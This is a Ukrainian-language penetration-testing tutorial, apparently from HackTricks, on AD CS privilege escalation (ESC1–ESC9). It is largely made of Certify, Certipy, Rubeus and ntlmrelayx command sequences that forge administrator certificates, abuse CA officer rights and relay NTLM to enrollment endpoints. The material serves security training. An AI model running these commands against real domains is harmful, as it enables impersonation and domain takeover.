# AD CS Підвищення привілеїв у домені

{{#include ../../../banners/hacktricks-training.md}}


**Це резюме розділів про техніки ескалації з публікацій:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів - ESC1

### Пояснення

### Неправильно налаштовані шаблони сертифікатів - пояснення ESC1

- **Права на реєстрацію (enrolment) надаються низькоправам користувачам через Enterprise CA.**
- **Не потрібно схвалення менеджера.**
- **Не потрібні підписи від уповноважених осіб.**
- **Security descriptors на шаблонах сертифікатів надто ліберальні, дозволяючи низькоправним користувачам отримувати права на реєстрацію (enrolment).**
- **Шаблони сертифікатів налаштовано з EKU, які полегшують аутентифікацію:**
- Extended Key Usage (EKU) ідентифікатори, такі як Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), або відсутність EKU (SubCA), включені.
- **Шаблон дозволяє запитувачам додавати subjectAltName у Certificate Signing Request (CSR):**
- Active Directory (AD) віддає пріоритет subjectAltName (SAN) у сертифікаті при перевірці ідентичності, якщо він присутній. Це означає, що вказавши SAN у CSR, можна запросити сертифікат для імітації будь-якого користувача (наприклад, домен-контролера або домен-адміністратора). Можливість вказати SAN запитувачем визначається в AD-об’єкті шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість — бітова маска (bitmask), і наявність прапора `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.

> [!CAUTION]
> Конфігурація, описана вище, дозволяє низькоправним користувачам запитувати сертифікати з будь-яким обраним SAN, що дає змогу аутентифікуватися як будь-який доменний принципал через Kerberos або SChannel.

Ця опція інколи увімкнена для підтримки динамічної генерації HTTPS або host сертифікатів продуктами чи службами розгортання, або через неповне розуміння її наслідків.

Зверніть увагу, що створення сертифіката з цією опцією генерує попередження, чого не відбувається, якщо існуючий шаблон сертифіката (наприклад, шаблон `WebServer`, у якого увімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюють і потім змінюють для включення OID для аутентифікації.

### Зловживання

Щоб знайти вразливі шаблони сертифікатів, ви можете виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Щоб **зловживати цією вразливістю і видавати себе за адміністратора**, можна запустити:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Потім ви можете перетворити згенерований **сертифікат у формат `.pfx`** і знову використати його, щоб **автентифікуватися за допомогою Rubeus або certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Бінарні файли Windows "Certreq.exe" та "Certutil.exe" можна використовувати для створення PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перелічення шаблонів сертифікатів у схемі конфігурації AD Forest, зокрема тих, що не потребують схвалення або підписів, які мають EKU Client Authentication або Smart Card Logon, і з встановленим прапором `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати, запустивши наступний LDAP-запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані шаблони сертифікатів - ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Enterprise CA надає права на реєстрацію сертифікатів користувачам з низькими привілеями.
2. Вимога схвалення менеджером відключена.
3. Вимога авторизованих підписів відсутня.
4. Надмірно ліберальний security descriptor у шаблоні сертифіката надає права на реєстрацію сертифікатів користувачам з низькими привілеями.
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

**Any Purpose EKU** дозволяє атакуючому отримати сертифікат для будь‑якої мети, включно з автентифікацією клієнта, автентифікацією сервера, підписуванням коду тощо. Ту саму **technique used for ESC3** можна використати для експлуатації цього сценарію.

Сертифікати з **no EKUs**, які діють як subordinate CA certificates, можна експлуатувати для будь‑якої мети і також використовувати для підписування нових сертифікатів. Отже, атакуючий може вказати довільні EKU або поля в нових сертифікатах, використавши subordinate CA certificate.

Однак нові сертифікати, створені для domain authentication, не працюватимуть, якщо subordinate CA не довіряється об’єктом `NTAuthCertificates` — це налаштування за замовчуванням. Тим не менш, атакуючий все ще може створювати нові сертифікати з будь‑яким EKU та довільними значеннями сертифіката. Це потенційно може бути зловживано для широкого кола цілей (наприклад, підписування коду, автентифікація сервера тощо) і мати значні наслідки для інших додатків у мережі, таких як SAML, AD FS або IPSec.

Щоб перерахувати шаблони, що відповідають цьому сценарію в схемі конфігурації AD Forest, можна виконати наступний LDAP‑запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані Enrolment Agent Templates - ESC3

### Пояснення

Цей сценарій схожий на перший і другий, але **зловживає** **іншим EKU** (Certificate Request Agent) та **2 різними шаблонами** (тому має 2 набори вимог),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), відомий як **Enrollment Agent** у документації Microsoft, дозволяє суб'єкту **enroll** для **certificate** від **імені іншого користувача**.

**“enrollment agent”** реєструється в такому **шаблоні** і використовує отриманий **certificate**, щоб співпідписати CSR **від імені іншого користувача**. Потім він **відправляє** співпідписаний CSR на CA, реєструючись у **шаблоні**, який дозволяє **“enroll on behalf of”**, і CA видає **certificate**, що належить **“іншому” користувачу**.

**Requirements 1:**

- Enterprise CA надає права на enrollment користувачам з низькими привілеями.
- Вимога схвалення менеджера відсутня.
- Немає вимоги авторизованих підписів.
- Дескриптор безпеки шаблону сертифіката надмірно дозволяє, надаючи права enrollment користувачам з низькими привілеями.
- Шаблон сертифіката включає Certificate Request Agent EKU, що дозволяє запитувати інші шаблони сертифікатів від імені інших суб'єктів.

**Requirements 2:**

- Enterprise CA надає права на enrollment користувачам з низькими привілеями.
- Схвалення менеджера обходиться.
- Схема версії шаблону або 1, або більше 2, і вона вказує Application Policy Issuance Requirement, що вимагає Certificate Request Agent EKU.
- EKU, визначений у шаблоні сертифіката, дозволяє аутентифікацію домену.
- Обмеження для enrollment agents не застосовуються на CA.

### Зловживання

Для зловживання цим сценарієм можна використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy):
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Користувачі, яким дозволено **отримувати** сертифікат агента реєстрації, шаблони, у які агенти реєстрації мають право записуватися, та **облікові записи**, від імені яких агент реєстрації може діяти, можуть обмежуватися корпоративними CA. Це здійснюється шляхом відкриття `certsrc.msc` **snap-in**, **натискання правою кнопкою миші на CA**, **вибору Properties**, а потім **перехід на** вкладку “Enrollment Agents”.

Однак варто зауважити, що **за замовчуванням** налаштування для CA — “**Do not restrict enrollment agents**.” Якщо адміністратори вмикають обмеження для агентів реєстрації, встановлюючи його на “Restrict enrollment agents,” стандартна конфігурація залишається вкрай ліберальною. Вона дозволяє **Everyone** записуватися в усі шаблони від імені будь-кого.

## Уразливий контроль доступу до шаблонів сертифікатів - ESC4

### **Пояснення**

**Дескриптор безпеки** на **шаблонах сертифікатів** визначає **права**, які мають конкретні **AD principals** щодо шаблону.

Якщо **атакуючий** має необхідні **права** для **зміни** **шаблону** та **впровадження** будь-яких **експлуатованих неправильних конфігурацій**, описаних у **попередніх розділах**, це може сприяти ескалації привілеїв.

З-поміж помітних прав, що застосовуються до шаблонів сертифікатів, є:

- **Owner:** Надає неявний контроль над об’єктом, дозволяючи змінювати будь‑які атрибути.
- **FullControl:** Дає повну владу над об’єктом, включно з можливістю змінювати будь‑які атрибути.
- **WriteOwner:** Дозволяє змінити власника об’єкта на принципал під контролем атакуючого.
- **WriteDacl:** Дозволяє коригувати контроль доступу, потенційно надаючи атакуючому FullControl.
- **WriteProperty:** Авторизує редагування будь‑яких властивостей об’єкта.

### Зловживання

Щоб ідентифікувати принципалів з правами редагування шаблонів та інших PKI-об’єктів, перераховуйте за допомогою Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Приклад privesc, схожий на попередній:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 — це випадок, коли користувач має права запису на шаблон сертифіката. Цим, наприклад, можна зловживати, перезаписавши конфігурацію шаблона сертифіката, щоб зробити шаблон вразливим до ESC1.

Як видно в наведеному вище шляху, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` має нове ребро `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов'язана з сертифікатами, я також реалізував цю атаку, відому як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ось невеликий огляд команди Certipy’s `shadow auto` для отримання NT hash жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. За **замовчуванням**, Certipy **перезапише** конфігурацію, зробивши її **вразливою до ESC1**. Ми також можемо вказати **параметр `-save-old`, щоб зберегти стару конфігурацію**, що буде корисно для **відновлення** конфігурації після нашої атаки.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Пояснення

Широка мережа взаємопов'язаних зв'язків на основі ACL, яка включає кілька об'єктів, окрім шаблонів сертифікатів і сертифікаційного центру, може впливати на безпеку всієї системи AD CS. Ці об'єкти, що суттєво впливають на безпеку, охоплюють:

- AD computer object серверу CA, який може бути скомпрометований за допомогою механізмів на кшталт S4U2Self або S4U2Proxy.
- RPC/DCOM server серверу CA.
- Будь-який нащадковий AD object або контейнер у межах конкретного шляху `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях включає, але не обмежується, контейнерами та об'єктами такими як Certificate Templates container, Certification Authorities container, NTAuthCertificates object та Enrollment Services Container.

Безпека PKI-системи може бути порушена, якщо атакуючий з низькими привілеями отримає контроль над будь-яким із цих критичних компонентів.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

Тема, висвітлена в пості [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage), також торкається наслідків прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, як це описано Microsoft. Ця конфігурація, коли вона активована на Certification Authority (CA), дозволяє включати **користувацькі значення** в **subject alternative name** для **будь-якого запиту**, включно з тими, що сформовані з Active Directory®. Відповідно, це дає змогу **зловмисникові** зареєструватися через **будь-який шаблон**, налаштований для автентифікації домену — зокрема ті, що відкриті для реєстрації неповноважними користувачами, як-от стандартний User template. Внаслідок цього можна отримати сертифікат, який дозволяє зловмисникові автентифікуватися як адміністратор домену або **будь-який інший активний об'єкт** у домені.

**Примітка**: Підхід для додавання **alternative names** у Certificate Signing Request (CSR) через аргумент `-attrib "SAN:"` в `certreq.exe` (згадуваний як “Name Value Pairs”) відрізняється від стратегії експлуатації SAN у ESC1. Різниця полягає в тому, як інформація про обліковий запис інкапсулюється — у вигляді атрибуту сертифіката, а не розширення.

### Зловживання

Щоб перевірити, чи налаштування активовано, організації можуть скористатися наступною командою з `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція по суті використовує **remote registry access**, отже альтернативний підхід може бути таким:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Інструменти на кшталт [**Certify**](https://github.com/GhostPack/Certify) і [**Certipy**](https://github.com/ly4k/Certipy) можуть виявляти цю неправильну конфігурацію та експлуатувати її:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Щоб змінити ці налаштування, за умови наявності прав **domain administrative** або еквівалентних, з будь-якої робочої станції можна виконати таку команду:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, цей прапорець можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Після оновлень безпеки травня 2022 року нововидані **сертифікати** міститимуть **розширення безпеки**, яке включає **`objectSid` властивість запитувача**. Для ESC1 цей SID походить зі вказаного SAN. Однак для **ESC6** SID відображає **`objectSid` запитувача**, а не SAN.\
> Щоб експлуатувати ESC6, система має бути вразливою до ESC10 (Weak Certificate Mappings), який віддає пріоритет **SAN над новим розширенням безпеки**.

## Уразливий контроль доступу центру сертифікації - ESC7

### Атака 1

#### Пояснення

Контроль доступу до центру сертифікації здійснюється за допомогою набору дозволів, що керують діями CA. Ці дозволи можна переглянути, відкривши `certsrv.msc`, клацнувши правою кнопкою миші на CA, вибравши Properties, а потім перейшовши на вкладку Security. Додатково, дозволи можна перелічити за допомогою модуля PSPKI такими командами:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Abuse

Наявність права **`ManageCA`** на центр сертифікації дозволяє суб’єкту змінювати налаштування дистанційно за допомогою PSPKI. Це включає переключення прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, щоб дозволити вказувати SAN у будь-якому шаблоні — критичний компонент ескалації в домені.

Спрощення цього процесу досягається за допомогою cmdlet'а PSPKI **Enable-PolicyModuleFlag**, що дозволяє вносити зміни без прямої взаємодії з GUI.

Наявність права **`ManageCertificates`** дозволяє схвалювати очікувані запити, фактично обходячи захист «погодження менеджера сертифікатів CA».

Комбінація модулів **Certify** та **PSPKI** може бути використана для запиту, схвалення та завантаження сертифіката:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Атака 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** **`Manage CA`** права доступу були використані, щоб **увімкнути** прапорець **EDITF_ATTRIBUTESUBJECTALTNAME2** для виконання **ESC6 attack**, але це не матиме жодного ефекту, доки служба CA (`CertSvc`) не буде перезапущена. Коли користувач має `Manage CA` право доступу, йому також дозволено **перезапустити службу**. Проте це **не означає, що користувач може перезапустити службу віддалено**. Крім того, E**SC6 might not work out of the box** у більшості патчених середовищ через оновлення безпеки May 2022.

Передумови:

- Тільки **`ManageCA` дозвіл**
- **`Manage Certificates`** дозвіл (може бути наданий з **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **увімкнений** (може бути увімкнений з **`ManageCA`**)

Техніка спирається на те, що користувачі з правами доступу `Manage CA` _та_ `Manage Certificates` можуть **issue failed certificate requests**. Шаблон сертифіката `SubCA` є **vulnerable to ESC1**, але **тільки адміністратори** можуть зареєструватися в цьому шаблоні. Отже, **користувач** може **request** реєстрацію у `SubCA` — яка буде **denied** — але **потім issued менеджером**.

#### Зловживання

Ви можете **надати собі `Manage Certificates`** право доступу, додавши свого користувача як нового офіцера.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** можна **увімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон **`SubCA`** увімкнено.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали передумови для цієї атаки, можемо почати з **запиту certificate на основі шаблону `SubCA`**.

**Цей запит буде відхилен**о, але ми збережемо private key і запишемо request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Маючи наші **`Manage CA` та `Manage Certificates`**, ми можемо потім **видавати сертифікат для невдалого запиту** за допомогою команди `ca` і параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` та параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Атака 3 – Manage Certificates Extension Abuse (SetExtension)

#### Пояснення

Окрім класичних зловживань ESC7 (уключення EDITF атрибутів або затвердження очікуваних запитів), **Certify 2.0** виявив новий примітив, який вимагає лише роль *Manage Certificates* (також відома як **Certificate Manager / Officer**) на Enterprise CA.

RPC-метод `ICertAdmin::SetExtension` може бути виконаний будь-яким обліковим записом, що має *Manage Certificates*. Хоча метод традиційно використовувався легітимними CA для оновлення розширень у **pending** запитах, атака дозволяє додати *незвичне* розширення сертифіката (наприклад кастомний OID *Certificate Issuance Policy*, такий як `1.1.1.1`) до запиту, що чекає на затвердження.

Оскільки цільовий шаблон **не визначає значення за замовчуванням** для цього розширення, CA НЕ перезапише кероване атакуючим значення під час видачі сертифіката. Результуючий сертифікат отримає розширення, обране атакуючим, яке може:

* Задовольнити вимоги Application / Issuance Policy у інших вразливих шаблонів (призводячи до ескалації привілеїв).
* Інжектувати додаткові EKU або політики, що надають сертифікату несподівану довіру в сторонніх системах.

Коротко: *Manage Certificates* — раніше вважалася «менш потужною» половиною ESC7 — тепер може бути використана для повної ескалації привілеїв або довготривалої персистенції, без змін конфігурації CA або потреби у більш обмежуючому праві *Manage CA*.

#### Зловживання примітивом за допомогою Certify 2.0

1. **Подайте запит на сертифікат, який залишатиметься *pending*.** Це можна змусити за допомогою шаблону, що вимагає схвалення менеджера:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Додайте кастомне розширення до pending запиту** за допомогою нової команди `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Якщо шаблон ще не визначає розширення *Certificate Issuance Policies*, наведене вище значення буде збережено після видачі.*

3. **Видайте запит** (якщо ваша роль також має права затвердження *Manage Certificates*) або дочекайтесь, поки оператор його затвердить. Після видачі завантажте сертифікат:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Результуючий сертифікат тепер містить зловмисний issuance-policy OID і може бути використаний у наступних атаках (наприклад ESC13, ескалація у домені тощо).

> NOTE:  Ту саму атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` і параметр `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **AD CS встановлено**, якщо існує вразливий **web enrollment endpoint** і принаймні один **certificate template** опублікований, що дозволяє **domain computer enrollment та client authentication** (наприклад дефолтний **`Machine`** шаблон), це робить можливим компрометацію **будь-якого комп’ютера з активним spooler service** атакуючим!

AD CS підтримує декілька **HTTP-based enrollment** методів, які надаються через додаткові серверні ролі, що адміністратори можуть встановити. Ці інтерфейси для HTTP-реєстрації сертифікатів вразливі до **NTLM relay** атак. Атакуючий, зкомпрометувавши машину, може видавати себе за будь-який AD обліковий запис, який автентифікується через вхідний NTLM. Під особою жертви ці веб-інтерфейси можна використати для **запиту client authentication certificate** з використанням шаблонів `User` або `Machine`.

- **Web enrollment interface** (старіший ASP-додаток, доступний за `http://<caserver>/certsrv/`) за замовчуванням працює через HTTP, що не захищає від NTLM relay атак. Крім того, він явно дозволяє лише NTLM аутентифікацію через свої Authorization HTTP заголовки, роблячи більш безпечні методи аутентифікації, як Kerberos, непридатними.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service та **Network Device Enrollment Service** (NDES) за замовчуванням підтримують negotiate аутентифікацію через свій Authorization HTTP заголовок. Negotiate підтримує як Kerberos, так і **NTLM**, дозволяючи атакуючому **понизити до NTLM** під час relay атак. Хоча ці веб-служби зазвичай запускаються з HTTPS, сам по собі HTTPS **не захищає від NTLM relay**. Захист від NTLM relay для HTTPS сервісів можливий лише коли HTTPS поєднано з channel binding. На жаль, AD CS не вмикає Extended Protection for Authentication на IIS, що необхідно для channel binding.

Поширеною **проблемою** NTLM relay атак є **коротка тривалість NTLM сесій** та неможливість атакуючого взаємодіяти зі службами, які **вимагають NTLM signing**.

Втім, це обмеження обходиться шляхом використання NTLM relay для отримання сертифіката для користувача — термін дії сертифіката визначає тривалість сесії, а сертифікат можна застосовувати до сервісів, що **вимагають NTLM signing**. Інструкції з використання вкраденого сертифіката див. у:

{{#ref}}
account-persistence.md
{{#endref}}

Ще одне обмеження NTLM relay атак полягає в тому, що **машина, під контролем атакуючого, має бути автентифікована обліковим записом жертви**. Атакуючий може або чекати, або спробувати **примусити** цю автентифікацію:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` перераховує **увімкнені HTTP AD CS кінцеві точки**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними органами сертифікації (CAs) для зберігання кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна розпарсити та перерахувати за допомогою інструмента **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання за допомогою [Certipy](https://github.com/ly4k/Certipy)

Запит на сертифікат за замовчуванням виконується Certipy на основі шаблону `Machine` або `User`, що визначається тим, чи закінчується ім'я облікового запису, яке ретранслюється, на `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.

Потім можна застосувати техніку, таку як [PetitPotam](https://github.com/ly4k/PetitPotam), щоб змусити провести аутентифікацію. При роботі з контролерами домену необхідно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Відсутність розширення безпеки - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Нове значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, запобігає вбудовуванню **нового `szOID_NTDS_CA_SECURITY_EXT` розширення безпеки** в сертифікат. Цей прапорець набуває значення, коли `StrongCertificateBindingEnforcement` встановлено в `1` (налаштування за замовчуванням), на відміну від значення `2`. Його значущість зростає у сценаріях, де може бути використано слабше відображення сертифікатів для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінює вимог.

Умови, за яких налаштування цього прапорця набуває значення, включають:

- `StrongCertificateBindingEnforcement` не встановлено на `2` (за замовчуванням `1`), або `CertificateMappingMethods` містить прапорець `UPN`.
- Сертифікат позначено прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
- Сертифікат вказує будь-який EKU для автентифікації клієнта.
- `GenericWrite` дозволи доступні на будь-який акаунт, щоб скомпрометувати інший.

### Сценарій зловживання

Припустимо, `John@corp.local` має `GenericWrite` дозволи над `Jane@corp.local`, з метою скомпрометувати `Administrator@corp.local`. Шаблон сертифіката `ESC9`, в який `Jane@corp.local` має право enroll, налаштований з прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у параметрі `msPKI-Enrollment-Flag`.

Спочатку хеш `Jane` отримано за допомогою Shadow Credentials завдяки `John`-овому `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Згодом значення `userPrincipalName` користувача `Jane` було змінено на `Administrator`, навмисно опустивши частину домену `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ця модифікація не порушує обмежень, оскільки `Administrator@corp.local` залишається відмінним як `Administrator`'s `userPrincipalName`.

Після цього шаблон сертифіката `ESC9`, позначений вразливим, запитується як `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Зауважено, що у сертифіката поле `userPrincipalName` відображає `Administrator`, позбавлене будь-якого “object SID”.

